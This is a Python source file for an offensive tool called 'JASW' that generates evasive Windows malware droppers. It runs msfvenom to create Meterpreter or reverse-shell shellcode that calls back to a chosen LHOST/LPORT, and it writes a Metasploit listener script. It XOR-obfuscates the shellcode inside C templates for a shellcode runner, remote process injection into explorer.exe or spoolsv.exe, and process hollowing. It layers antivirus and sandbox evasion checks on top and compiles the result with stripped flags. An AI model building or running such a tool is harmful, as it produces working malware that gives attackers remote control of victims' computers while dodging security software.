#!/usr/bin/env python3
import os
import random
import socket
import string
import subprocess

import emoji
import psutil
from termcolor import cprint


def intro():
    from art import text2art
    print(text2art("JASW", "graffiti"))
    print()
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/EnginDemirbilek/Flip")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
        ":thumbs_up:") + " Many thanks to https://github.com/icyguider/Shhhloader")
    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere and my mommy")
    print()
    print(text2art("JASW", "efti_wall"))


class Bypass:
    func_name = None

    def __init__(self):
        self.func_name = ShellCoder.make_random_str()

    def get_template(self):
        raise NotImplemented()

    def additional_import(self):
        return ""

    def additional_flags(self):
        return []

    def get_call(self):
        return '''
        {func_name}() == 1
        '''.format(func_name=self.func_name)


class VerifyInputName(Bypass):
    binary_name = None

    def __init__(self):
        super().__init__()
        self.binary_name = self.ask_for_binary_name()
        self.arg_name = ShellCoder.make_random_str()

    @staticmethod
    def menu():
        return "Verify the binary name"

    def get_template(self):
        return '''
        
int {func_name}(const char *{arg_name}) {{
    if (strstr({arg_name}, "{binary_name}") == NULL) {{
        return 0; 
    }}
    
    return 1;
}}
        '''.format(
            func_name=self.func_name,
            arg_name=self.arg_name,
            binary_name=self.binary_name)

    def get_call(self):
        return '''
        {func_name}(argv[0]) == 1
        '''.format(func_name=self.func_name)

    @staticmethod
    def ask_for_binary_name():
        print("What is the name of result binary (without extension)?")
        binary_name = input(" name ?")
        return binary_name


class AllocateAndFill100M0Memory(Bypass):

    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Allocate and fill 100M memory"

    def get_template(self):
        return '''
        
int {0}() {{
    char * {1} = NULL;
    {1} = (char *) malloc(100000000);
    
    if({1}==NULL)
    {{
        return 0;
    }}
    
    memset({1},00, 100000000);
    free({1});
    
    return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
        )


class HundredMillionIncrements(Bypass):

    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Hundred million increments"

    def get_template(self):
        return '''
        
int {0}() {{
    int {1} = 0;
    int {2} = 0;
    
    for({2} = 0; {2} < 100000000; {2}++)
    {{
      {1}++;
    }}
    
    if({1} == 100000000){{
        return 1;
    }}
    
    return 0;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str()
        )


class AttemptToOpenASystemProcess(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Attempt to open a system process"

    def get_template(self):
        return '''
        
int {0}() {{
    HANDLE {1};
    
    {1} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4);
    
    if ({1} != NULL)
    {{
      return 0;
    }}
    
    return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str()
        )


class AttemptToOpenANonExistingURL(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Attempt to open a non-existing URL"

    def additional_import(self):
        return """#include <wininet.h>
#pragma comment(lib, "wininet.lib")
        """

    def additional_flags(self):
        return ["-lwininet"]

    def get_template(self):
        return '''
        
int {0}() {{
    char {1}[] = "http://{2}.{3}.com/";
    char {4}[1024];
    HINTERNET {5}, {6};
    DWORD {7};
    {5}=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    {6}=InternetOpenUrl({5},{1},NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
    
    if ({6}) {{
      InternetCloseHandle({5});
      InternetCloseHandle({6});
      return 0;
    }}
    
     InternetCloseHandle({5});
     InternetCloseHandle({6});
     
     return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
        )


class NonEmulatedAPINuma(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Non emulated API (VirtualAllocExNuma)"

    def get_template(self):
        return '''
        
int {0}() {{
    LPVOID {1} = NULL;
    {1} = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
  
    if ({1} == NULL)
    {{
      return 0;
    }}
    
    return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
        )


class FiberLocalStorage(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Fiber Local Storage"

    def get_template(self):
        return '''
        
int {0}() {{
    DWORD {1} = FlsAlloc(NULL);
  
    if ({1} == FLS_OUT_OF_INDEXES)
    {{
      return 0;
    }}
    
    return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
        )


class CheckProcessMemory(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Check process memory"

    def additional_import(self):
        return """#include <psapi.h>
#pragma comment(lib, "psapi.lib")
        """

    def get_template(self):
        return '''
        
int {0}() {{
    PROCESS_MEMORY_COUNTERS {1};
    GetProcessMemoryInfo(GetCurrentProcess(), &{1}, sizeof({1}));

    if({1}.WorkingSetSize<=3500000)
    {{
        return 1;
    }}
  
    return 0;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
        )


class TimeDistortionSleep(Bypass):
    def __init__(self):
        super().__init__()

    @staticmethod
    def menu():
        return "Time distortion (Sleep)"

    def additional_flags(self):
        return ['-lwinmm']

    def additional_import(self):
        return """#include <time.h>
#pragma comment (lib, "winmm.lib")
        """

    def get_template(self):
        return '''
        
int {0}() {{
    DWORD {1};
    DWORD {2};
    
    {1} = timeGetTime();
    Sleep(10000);
    {2} = timeGetTime();
    
    if({2} < ({1} + 9990))
    {{
        return 0;
    }}
    
    return 1;
}}
        '''.format(
            self.func_name,
            ShellCoder.make_random_str(),
            ShellCoder.make_random_str(),
        )


class ShellCoder:
    arch_output = None
    arch_payload = None
    output_path = None
    exit_func = None
    commands = []
    selected_bypass = []
    shellcode_path = None
    template_path = None
    additional_flags = []

    ARCH_X64 = 1
    ARCH_X86 = 2

    STAGED_PAYLOAD = 1
    NON_STAGED_PAYLOAD = 2

    def write_template(self, template_as_string):
        with open(self.template_path, 'w') as f:
            f.write(template_as_string)

    @staticmethod
    def make_random_str():
        nbr = random.randint(8, 35)
        random_str = ''.join(random.choice(string.ascii_letters) for i in range(nbr))
        return random_str

    @staticmethod
    def ask_arch():
        selected_arch = None

        cprint("What type of architecture do you want use for output binary?", "white", "on_blue")

        while selected_arch is None:
            print(emoji.emojize(":right_arrow:") + " [1] x64")
            print(emoji.emojize(":right_arrow:") + " [2] x86")

            selected_arch = input(" ? - ")

            if selected_arch == '1':
                selected_arch = ShellCoder.ARCH_X64
            elif selected_arch == '2':
                selected_arch = ShellCoder.ARCH_X86
            else:
                selected_arch = None

        return selected_arch

    @staticmethod
    def ask_ip_address():
        selected_answer = None
        selected_ip = None

        ips = []
        for interface in psutil.net_if_addrs().values():
            for addr in interface:
                if addr.family == socket.AF_INET:
                    ips.append(addr.address)

        while selected_answer is None:
            cprint("What LHOST do you want ?", "white", "on_blue")

            for i, ip_address in enumerate(ips):
                print(emoji.emojize(":right_arrow:") + " [%s] %s" % ((i + 1), ip_address))

            try:
                selected_answer = input(" ?")
                selected_answer = int(selected_answer) - 1
                selected_ip = ips[selected_answer]
                break
            except ValueError:
                selected_answer = None
            except IndexError:
                selected_answer = None

        return selected_ip

    @staticmethod
    def ask_lport():
        selected_port = None
        while selected_port is None:
            cprint("What LPORT do you want?", "white", "on_blue")
            selected_port = input(" ?")
            try:
                selected_port = int(selected_port)
            except ValueError:
                selected_port = None

        return selected_port

    @staticmethod
    def ask_for_exit_func():
        selected_answer = None

        cprint("What kind of EXIT Function do you want to use?", "white", "on_blue")

        while selected_answer is None:
            print(emoji.emojize(":right_arrow:") + " [1] process")
            print(emoji.emojize(":right_arrow:") + " [2] thread")
            print(emoji.emojize(":right_arrow:") + " [3] SEH")

            selected_answer = input(" ? - ")

            if selected_answer == '1':
                selected_answer = "process"

            elif selected_answer == '2':
                selected_answer = "thread"

            elif selected_answer == '3':
                selected_answer = "seh"

            else:
                selected_answer = None

        return selected_answer

    @staticmethod
    def ask_out_path():
        selected_answer = None
        cprint("Where do you want save binary and scripts? (path must exists)", "white", "on_blue")

        while selected_answer is None:
            selected_answer = input(" ? ")
            is_exist = os.path.exists(selected_answer)

            if is_exist is False:
                cprint("Path does not exist", "white", "on_red")
                selected_answer = None

        return selected_answer

    def __init__(self):
        self.selected_ip = self.ask_ip_address()
        self.selected_port = self.ask_lport()
        self.exit_func = self.ask_for_exit_func()
        self.output_path = self.ask_out_path()
        self.arch_output = self.ask_arch()


class Windows(ShellCoder):
    exe_name = None
    payload = None
    injection_technique = None
    available_bypass = [
        VerifyInputName,
        AllocateAndFill100M0Memory,
        HundredMillionIncrements,
        AttemptToOpenASystemProcess,
        AttemptToOpenANonExistingURL,
        NonEmulatedAPINuma,
        FiberLocalStorage,
        CheckProcessMemory,
        TimeDistortionSleep,
    ]

    def __init__(self):
        self.injection_technique = self.ask_for_technique()
        self.payload = self.ask_for_payload()
        super().__init__()
        self.gen_shellcode()
        self.selected_bypass = self.ask_for_bypass()
        self.gen_template()
        self.compile_payload()
        print(" OK Done")

    def gen_shellcode(self):
        self.shellcode_path = "%s/shellcode.raw" % self.output_path
        process_run = [
            'msfvenom', '-p', self.payload,
            'LHOST=%s' % self.selected_ip,
            'LPORT=%s' % self.selected_port,
            'EXITFUNC=%s' % self.exit_func,
            '-a', 'x64' if 'x64' in self.payload else 'x86',
            'f', 'raw',
            '-o', self.shellcode_path
        ]
        command = ' '.join(process_run)
        print(command)

        generate_script = """#!/bin/bash

{command}
               """.format(command=command)

        with open("%s/generate.sh" % self.output_path, 'w') as f:
            f.write(generate_script)

        listener_command = "msfconsole -q -x 'use multi/handler; set payload %s; set LHOST %s; set LPORT %s; set EXITFUNC %s;exploit'" % (
            self.payload, self.selected_ip, self.selected_port, self.exit_func)

        generate_script = """#!/bin/bash

{command}
                       """.format(command=listener_command)

        with open("%s/listener.sh" % self.output_path, 'w') as f:
            f.write(generate_script)

        subprocess.run(process_run)

    def xor_shellcode(self, data, key):
        key_len = len(key)
        key_as_int = list(map(ord, key))
        s = bytes(bytearray((
            (data[i] ^ key_as_int[i % key_len]) for i in range(0, len(data))
        )))
        shellcode = "\\x"
        shellcode += "\\x".join(format(b if isinstance(b, int) else ord(b), '02x') for b in s)
        return shellcode

    def open_shellcode(self, x_key):
        with open(self.shellcode_path, "rb") as raw_shellcode:
            return self.xor_shellcode(bytearray(raw_shellcode.read()), x_key)

    def shellcode_process_hollowing(self, bypass_functions, bypass_calls, bypass_imports):
        # TODO debug me
        xor_key = self.make_random_str()
        encoded_shellcode = self.open_shellcode(xor_key)
        return """#include <windows.h>
#include <winternl.h>
{bypass_imports}

#define CREATE_SUSPENDED 0x4
#define PROCESSBASICINFORMATION 0

{bypass_functions}

int main(int argc, char **argv) {{
    if ({bypass_calls}) {{
        unsigned char {proc_addr}[0x8];
        unsigned char {data_buf}[0x200];
        STARTUPINFO {s_info};
        PROCESS_INFORMATION {p_info};
        BOOL {c_result} = CreateProcess(NULL, "c:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL,
            FALSE, CREATE_SUSPENDED, NULL, NULL, &{s_info}, &{p_info});
        PROCESS_BASIC_INFORMATION {pb_info};
        ULONG {ret_len} = 0;
        LONG {q_result} = NtQueryInformationProcess({p_info}.hProcess, ProcessBasicInformation, &{pb_info}, sizeof({pb_info}), &{ret_len});
        PVOID {base_image_addr} = (PVOID)((ULONG64){pb_info}.PebBaseAddress + 0x10);
        SIZE_T {bytes_rw} = 0;
        BOOL {result} = ReadProcessMemory({p_info}.hProcess, {base_image_addr}, {proc_addr}, sizeof({proc_addr}), &{bytes_rw});
        PVOID {executable_address} = (PVOID)(*(ULONG64*){proc_addr});
        {result} = ReadProcessMemory({p_info}.hProcess, {executable_address}, {data_buf}, sizeof({data_buf}), &{bytes_rw});
        ULONG {e_lfanew} = *(ULONG*)({data_buf} + 0x3c);
        ULONG {rva_offset} = {e_lfanew} + 0x28;
        ULONG {rva} = *(ULONG*)({data_buf} + {rva_offset});
        PVOID {entrypoint_addr} = (PVOID)((ULONG64){executable_address} + {rva});
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];
        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
           if({counter_var} == sizeof {xor_var} -1) {{
               {counter_var}=0;
           }}
           {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
           {counter_var}++;
        }}
        {result} = WriteProcessMemory({p_info}.hProcess, {entrypoint_addr}, {shellcode}, sizeof({shellcode}), &{bytes_rw});
        DWORD {r_result} = ResumeThread({p_info}.hThread);
        WaitForSingleObject({p_info}.hProcess, INFINITE);
        CloseHandle({p_info}.hProcess);
        CloseHandle({p_info}.hThread);
    }}
}}
        """.format(
            bypass_imports=bypass_imports,
            bypass_functions=bypass_functions,
            bypass_calls=bypass_calls,
            proc_addr=self.make_random_str(),
            data_buf=self.make_random_str(),
            s_info=self.make_random_str(),
            p_info=self.make_random_str(),
            c_result=self.make_random_str(),
            pb_info=self.make_random_str(),
            ret_len=self.make_random_str(),
            q_result=self.make_random_str(),
            base_image_addr=self.make_random_str(),
            bytes_rw=self.make_random_str(),
            result=self.make_random_str(),
            executable_address=self.make_random_str(),
            e_lfanew=self.make_random_str(),
            rva_offset=self.make_random_str(),
            rva=self.make_random_str(),
            entrypoint_addr=self.make_random_str(),
            xor_var=self.make_random_str(),
            xor_key=xor_key,
            shellcode_var=self.make_random_str(),
            shellcode=self.make_random_str(),
            encoded_shellcode=self.open_shellcode(xor_key),
            counter_var=self.make_random_str(),
            increment_var=self.make_random_str(),
            r_result=self.make_random_str(),
        )

    def shellcode_runner_template(self, bypass_functions, bypass_calls, bypass_imports):
        xor_var = self.make_random_str()
        xor_key = self.make_random_str()
        shellcode_var = self.make_random_str()
        counter_var = self.make_random_str()
        increment_var = self.make_random_str()
        v_alloc_var = self.make_random_str()
        shellcode = self.make_random_str()
        encoded_shellcode = self.open_shellcode(xor_key)
        return """#include <windows.h>
#include <string>
{bypass_imports}
using namespace std;

{bypass_functions}

int main(int argc, char **argv) {{

int res = -1;

if (res == 0) {{
    printf("We start now !!");
}}


if ({bypass_calls}) {{
    char {xor_var}[] = "{xor_key}";
    char {shellcode_var}[] = "{encoded_shellcode}";
    char {shellcode}[sizeof {shellcode_var}];
    
    int {counter_var} = 0;
    for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
        if({counter_var} == sizeof {xor_var} -1) {{
            {counter_var}=0;
        }}
        {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
        {counter_var}++;
    }}

    void *{v_alloc_var} = VirtualAlloc(0, sizeof {shellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy({v_alloc_var}, {shellcode}, sizeof {shellcode});
    ((void(*)()){v_alloc_var})();
 }} else {{
    printf("in the second condition");
    return 0;
 }}
}}
        """.format(
            bypass_functions=bypass_functions,
            bypass_calls=bypass_calls,
            bypass_imports=bypass_imports,
            xor_var=xor_var,
            xor_key=xor_key,
            shellcode_var=shellcode_var,
            counter_var=counter_var,
            increment_var=increment_var,
            v_alloc_var=v_alloc_var,
            shellcode=shellcode,
            encoded_shellcode=encoded_shellcode
        )

    def process_injection_template(self, bypass_functions, bypass_calls, bypass_imports):
        xor_var = self.make_random_str()
        xor_key = self.make_random_str()
        shellcode_var = self.make_random_str()
        counter_var = self.make_random_str()
        increment_var = self.make_random_str()
        encoded_shellcode = self.open_shellcode(xor_key)

        return """#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <sddl.h>
{bypass_imports}
using namespace std;

{bypass_functions}

BOOL {is_elevated}() {{
    PSID {admin_group};
    BOOL {is_admin};
    SID_IDENTIFIER_AUTHORITY {NtAuthority} = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&{NtAuthority}, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &{admin_group})) {{
        return FALSE;
    }}
    if (!CheckTokenMembership(NULL, {admin_group}, &{is_admin})) {{
        {is_admin} = FALSE;
    }}
    FreeSid({admin_group});
    return {is_admin};
}}

DWORD {find_process_id}()
{{
    HANDLE {h_process_snap};
    PROCESSENTRY32 {pe32};
    DWORD {result} = 0;
    
    char *{process_name};
    
    if ({is_elevated}()) {{
        {process_name} = "spoolsv.exe";
    }} else {{
        {process_name} = "explorer.exe";
    }}

    {h_process_snap} = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (INVALID_HANDLE_VALUE == {h_process_snap}) {{
        return(FALSE);
    }}

    {pe32}.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First({h_process_snap}, &{pe32}))
    {{
        CloseHandle({h_process_snap});
        return(0);
    }}

    do
    {{
        if (0 == strcmp({process_name}, {pe32}.szExeFile))
        {{
            {result} = {pe32}.th32ProcessID;
            break;
        }}
    }} while (Process32Next({h_process_snap}, &{pe32}));

    CloseHandle({h_process_snap});

    return {result};
}}

int main(int argc, char **argv) {{
    int res = -1;

    if (res == 0) {{
        printf("We start now !!");
    }}

    if ({bypass_calls}) {{
        char {xor_var}[] = "{xor_key}";
        char {shellcode_var}[] = "{encoded_shellcode}";
        char {shellcode}[sizeof {shellcode_var}];
        
        int {counter_var} = 0;
        for(int {increment_var}=0; {increment_var} < sizeof {shellcode_var}; {increment_var}++) {{
            if({counter_var} == sizeof {xor_var} -1) {{
                {counter_var}=0;
            }}
            {shellcode}[{increment_var}] = {shellcode_var}[{increment_var}] ^ {xor_var}[{counter_var}];
            {counter_var}++;
        }}
        
        HANDLE {process_handle};
        HANDLE {remote_thread};
        PVOID {remote_buffer};
    
        {process_handle} = OpenProcess(PROCESS_ALL_ACCESS, FALSE, {find_process_id}());
        {remote_buffer} = VirtualAllocEx({process_handle}, NULL, sizeof {shellcode}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory({process_handle}, {remote_buffer}, {shellcode}, sizeof {shellcode}, NULL);
        {remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);
        CloseHandle({process_handle});
    }} else {{
        printf("in the second condition");
    }}
    
    return 0;
}} 
        """.format(
            bypass_imports=bypass_imports,
            bypass_functions=bypass_functions,
            find_process_id=self.make_random_str(),
            h_process_snap=self.make_random_str(),
            pe32=self.make_random_str(),
            result=self.make_random_str(),
            process_name=self.make_random_str(),
            bypass_calls=bypass_calls,
            xor_var=xor_var,
            xor_key=xor_key,
            shellcode_var=shellcode_var,
            encoded_shellcode=encoded_shellcode,
            shellcode=self.make_random_str(),
            counter_var=counter_var,
            increment_var=increment_var,
            process_handle=self.make_random_str(),
            remote_thread=self.make_random_str(),
            remote_buffer=self.make_random_str(),
            is_elevated=self.make_random_str(),
            NtAuthority=self.make_random_str(),
            is_admin=self.make_random_str(),
            admin_group=self.make_random_str(),
        )

    @staticmethod
    def ask_for_payload():
        selected_answer = None
        selected_payload = None

        payloads = [
            'windows/x64/meterpreter/reverse_https',
            'windows/x64/meterpreter/reverse_tcp',
            'windows/x64/shell/reverse_tcp',
            'windows/meterpreter/reverse_https',
            'windows/meterpreter/reverse_tcp',
            'windows/shell/reverse_https',
            'windows/shell/reverse_tcp',
        ]

        cprint("What kind of payload do you want use?", "white", "on_blue")

        while selected_answer is None:
            for i, payload in enumerate(payloads):
                print(emoji.emojize(":right_arrow:") + " [%s] %s" % ((i + 1), payload))

            try:
                selected_answer = input(" ?")
                selected_answer = int(selected_answer) - 1
                selected_payload = payloads[selected_answer]
                break
            except ValueError:
                selected_answer = None
            except IndexError:
                selected_answer = None

        return selected_payload

    @staticmethod
    def ask_for_technique():
        selected_answer = None

        while selected_answer is None:
            cprint(" What injection technique do you want use?", "white", "on_blue")
            print(emoji.emojize(":right_arrow:") + " [1] - shellcode runner")
            print(emoji.emojize(":right_arrow:") + " [2] - process injection")
            # print(emoji.emojize(":right_arrow:") + " [2] - process hollowing")

            selected_answer = input(" ? ")

            # if selected_answer not in ("1", "2", "3"):
            if selected_answer not in ("1", "2"):
                selected_answer = None

        return selected_answer

    def ask_for_bypass(self):
        select_answer = None
        select_bypass = []

        while select_answer is None:
            cprint("Choose one or more anti-virus evasion techniques  (value separate by comma (eg: 1,3,4))", "white",
                   "on_blue")

            for i, bypass in enumerate(self.available_bypass):
                print(emoji.emojize(":right_arrow:") + " [%s] %s" % ((i + 1), bypass.menu()))

            select_answer = input('?')
            try:
                select_bypass = [self.available_bypass[int(c) - 1] for c in select_answer.split(',')]
            except ValueError:
                select_answer = None
            except IndexError:
                select_answer = None

        return select_bypass

    def gen_bypass(self):
        bypass_functions = []
        bypass_calls = []
        bypass_imports = []

        for bypass in self.selected_bypass:
            b = bypass()
            bypass_functions.append(b.get_template())
            bypass_calls.append(b.get_call())

            if b.additional_import() != "":
                bypass_imports.append(b.additional_import())

            self.additional_flags = self.additional_flags + b.additional_flags()

        return '\n\n'.join(bypass_functions), ' && '.join(bypass_calls), '\n'.join(bypass_imports)

    def gen_template(self):
        bypass_functions, bypass_calls, bypass_imports = self.gen_bypass()

        if self.injection_technique == "1":
            template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
        elif self.injection_technique == "2":
            template = self.process_injection_template(bypass_functions, bypass_calls, bypass_imports)
        elif self.injection_technique == "3":
            template = self.shellcode_process_hollowing(bypass_functions, bypass_calls, bypass_imports)
        else:
            raise NotImplemented("Unknown injection technique")
        self.template_path = "%s/template.c" % self.output_path
        self.write_template(template)

    def compile_payload(self):
        if self.arch_output == ShellCoder.ARCH_X86:
            command = 'i686-w64-mingw32-g++ %s -o %s/shellcoder.exe -lws2_32' % (self.template_path, self.output_path)
        else:
            command = 'x86_64-w64-mingw32-g++ %s -o %s/shellcoder.exe' % (self.template_path, self.output_path)

        command += ' -s ' \
                   ' -w ' \
                   '-fomit-frame-pointer ' \
                   '-fno-unwind-tables  ' \
                   '-ffunction-sections ' \
                   '-fno-ident ' \
                   '-fdata-sections ' \
                   '-Wno-write-strings ' \
                   '-fno-exceptions ' \
                   '-fmerge-all-constants ' \
                   '-static-libstdc++ ' \
                   '-static-libgcc ' \
                   '-lntdll ' \
                   '-Wl,--gc-sections'

        for flag in self.additional_flags:
            if flag not in command:
                command += " %s " % flag

        compile_script = """
#!/bin/bash

{command}
        
        """.format(command=command.replace("%s/" % self.output_path, './'))

        with open("%s/compile.sh" % self.output_path, 'w') as f:
            f.write(compile_script)

        os.system(command)


if '__main__' == __name__:
    intro()
    print()
    win = Windows()
# cprint(" What kind of target is it?", "white", "on_blue")
# print()
# print(emoji.emojize(":right_arrow:") + " [1] Windows ")
# print(emoji.emojize(":right_arrow:") + " [2] Linux ")
# target = input(" ? ")
# if target == '1':
#     win = Windows()
# elif target == '2':
# Linux()
# else:
#   raise Exception("Unknown target")
